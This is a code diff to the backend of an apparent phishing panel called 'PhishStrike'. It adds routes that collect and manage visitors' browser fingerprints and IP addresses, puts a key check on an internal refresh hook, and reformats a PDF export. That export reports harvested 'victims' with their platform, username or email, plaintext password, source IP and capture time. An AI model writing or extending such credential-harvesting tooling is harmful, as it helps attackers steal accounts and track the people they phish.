@@ -25,6 +25,10 @@ _cors = Config.cors_origin_list() or "*"
 socketio = SocketIO(app, cors_allowed_origins=_cors, async_mode="threading")
 
 
+def _validate_internal_key():
+    return request.headers.get("X-Internal-Key") == Config.internal_api_key()
+
+
 def _emit_refresh():
     socketio.emit("new_victim", {"status": "refresh"})
 
@@ -93,6 +97,71 @@ def reset_ids():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+@app.route("/api/log_fingerprint", methods=["POST"])
+def log_fingerprint():
+    try:
+        data = request.get_json()
+        ip = request.remote_addr
+        database.add_fingerprint(
+            data.get("os"),
+            data.get("browser"),
+            data.get("screen_width"),
+            data.get("screen_height"),
+            data.get("language"),
+            data.get("time_zone"),
+            ip
+        )
+        log.info(f"Fingerprint logged: {data.get('os')} - {ip}")
+        socketio.emit("new_fingerprint", data)
+        return jsonify({"status": "success"})
+    except Exception as e:
+        log.error(f"Failed to log fingerprint: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/fingerprints")
+def get_fingerprints():
+    try:
+        fingerprints = database.get_all_fingerprints()
+        return jsonify(fingerprints)
+    except Exception as e:
+        log.error(f"Failed to get fingerprints: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/delete_fingerprint/<int:fingerprint_id>", methods=["POST"])
+def delete_fingerprint(fingerprint_id):
+    try:
+        database.delete_fingerprint(fingerprint_id)
+        log.info(f"Fingerprint #{fingerprint_id} deleted")
+        return jsonify({"status": "success"})
+    except Exception as e:
+        log.error(f"Failed to delete fingerprint #{fingerprint_id}: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/delete_all_fingerprints", methods=["POST"])
+def delete_all_fingerprints():
+    try:
+        database.clear_all_fingerprints()
+        log.warning("All fingerprints cleared")
+        return jsonify({"status": "success"})
+    except Exception as e:
+        log.error(f"Failed to clear all fingerprints: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/reset_fingerprint_ids", methods=["POST"])
+def reset_fingerprint_ids():
+    try:
+        database.reset_fingerprint_ids()
+        log.info("Fingerprint IDs reset to start from 1")
+        return jsonify({"status": "success"})
+    except Exception as e:
+        log.error(f"Failed to reset fingerprint IDs: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
 @app.route("/api/export")
 def export_excel():
     try:
@@ -150,22 +219,15 @@ def export_pdf():
 
         class PDF(FPDF):
             def header(self):
-                # Background color for header
                 self.set_fill_color(15, 23, 42)
                 self.rect(0, 0, 297, 40, 'F')
-                
-                # Main title
                 self.set_font("Helvetica", "B", 24)
                 self.set_text_color(59, 130, 246)
                 self.set_xy(0, 15)
                 self.cell(0, 10, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
-                
-                # Subtitle with generation time
                 self.set_font("Helvetica", "", 10)
                 self.set_text_color(200, 200, 200)
                 self.cell(0, 8, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 0, 1, "C")
-                
-                # Decorative line
                 self.set_y(38)
                 self.set_fill_color(59, 130, 246)
                 self.rect(0, 38, 297, 2, 'F')
@@ -183,19 +245,15 @@ def export_pdf():
         pdf.set_auto_page_break(auto=True, margin=10)
         pdf.add_page(orientation='L')
         pdf.set_margins(10, 10, 10)
-
         pdf.set_font("Helvetica", "B", 16)
         pdf.set_text_color(59, 130, 246)
         pdf.cell(0, 12, "EXECUTIVE SUMMARY", 0, 1)
         pdf.ln(5)
-
-        # Summary box with background
         pdf.set_fill_color(30, 41, 59)
         pdf.set_draw_color(59, 130, 246)
         box_y = pdf.get_y()
         pdf.rect(10, box_y, 277, 35, 'FD')
         pdf.set_xy(15, box_y + 12)
-        
         pdf.set_font("Helvetica", "", 12)
         pdf.set_text_color(255, 255, 255)
         summary_data = [
@@ -212,19 +270,15 @@ def export_pdf():
             pdf.cell(0, 10, f" {value}", 0, 0)
             x_pos += 95
         pdf.ln(25)
-
         pdf.set_font("Helvetica", "B", 16)
         pdf.set_text_color(59, 130, 246)
         pdf.cell(0, 12, "PLATFORM DISTRIBUTION", 0, 1)
         pdf.ln(5)
-
-        # Platform distribution box
         pdf.set_fill_color(30, 41, 59)
         pdf.set_draw_color(59, 130, 246)
         box_y = pdf.get_y()
         pdf.rect(10, box_y, 277, 30, 'FD')
         pdf.set_xy(15, box_y + 10)
-        
         pdf.set_font("Helvetica", "", 11)
         pdf.set_text_color(255, 255, 255)
         x_pos = 15
@@ -233,38 +287,29 @@ def export_pdf():
             pdf.cell(0, 10, f"{platform}: {count} credentials", 0, 0)
             x_pos += 140
         pdf.ln(22)
-
         pdf.set_font("Helvetica", "B", 14)
         pdf.set_text_color(59, 130, 246)
         pdf.cell(0, 10, "COLLECTED INTELLIGENCE", 0, 1)
         pdf.ln(5)
-
         pdf.set_font("Helvetica", "B", 9)
         pdf.set_text_color(255, 255, 255)
         pdf.set_fill_color(30, 41, 59)
         pdf.set_draw_color(59, 130, 246)
-
         headers = [
             ("ID", 8), ("Platform", 30), ("Username/Email", 71),
             ("Password", 71), ("Source IP", 48), ("Captured At", 48),
         ]
         col_widths = [w for (_, w) in headers]
-        
         for header, width in headers:
             pdf.cell(width, 8, header, 1, 0, "C", True)
         pdf.ln()
-        
-        # Draw blue border around table
         pdf.set_draw_color(59, 130, 246)
         table_width = sum(col_widths)
         table_x = 10
         table_y = pdf.get_y() - 8
         pdf.rect(table_x, table_y, table_width, 8, 'D')
-
-        # Render rows with alternating colors
         pdf.set_font("Helvetica", "", 9)
         pdf.set_text_color(0, 0, 0)
-        
         line_h = 8
 
         def _fit_text(text, width, font_name="Helvetica", font_size=9):
@@ -272,17 +317,13 @@ def export_pdf():
                 return ''
             text = str(text)
             pdf.set_font(font_name, "", font_size)
-            # Return full text without truncation
             return text
 
         row_count = 0
         for v in victims:
             cells = [str(v[0]), str(v[1]), str(v[2]), (str(v[3]) if v[3] is not None else ''), str(v[4]), str(v[5])]
-
-            # page break if needed
             if pdf.get_y() + line_h > pdf.h - pdf.b_margin:
                 pdf.add_page(orientation='L')
-                # re-draw headers
                 pdf.set_font("Helvetica", "B", 9)
                 pdf.set_text_color(255, 255, 255)
                 pdf.set_fill_color(30, 41, 59)
@@ -292,13 +333,10 @@ def export_pdf():
                 pdf.set_font("Helvetica", "", 9)
                 pdf.set_text_color(0, 0, 0)
                 row_count = 0
-
-            # Alternating row colors
             if row_count % 2 == 0:
                 pdf.set_fill_color(248, 250, 252)
             else:
                 pdf.set_fill_color(255, 255, 255)
-            
             for i, txt in enumerate(cells):
                 w = col_widths[i]
                 if i == 3:
@@ -311,7 +349,6 @@ def export_pdf():
                 pdf.cell(w, line_h, fitted, 1, 0, align, True)
             pdf.ln()
             row_count += 1
-
         buf = io.BytesIO(pdf.output())
         filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
         log.info(f"PDF report generated: {filename}")
@@ -354,7 +391,8 @@ def export_json():
 
 @app.route("/api/internal/refresh", methods=["GET", "POST"])
 def internal_refresh():
-    """CLI capture hook."""
+    if not _validate_internal_key():
+        return jsonify({"status": "error", "message": "invalid key"}), 403
     _emit_refresh()
     return jsonify({"status": "ok"})
 
